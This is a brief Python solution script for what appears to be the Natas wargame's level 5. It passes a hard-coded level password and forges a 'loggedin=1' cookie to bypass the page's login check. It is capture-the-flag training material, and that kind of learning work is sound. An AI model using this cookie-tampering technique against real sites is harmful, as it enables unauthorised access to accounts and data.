import config
import requests

import utils

"""
1. you need to change the cookie that's sent to the endpoint to access the level
"""

username = "natas5"
url = config.BASE_URL.format(username)
password = "Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD"
cookies = {"loggedin": "1"}

r = requests.get(url ,auth=(username, password), cookies=cookies)

print(r.text)

utils.save_file("output.txt", r.text)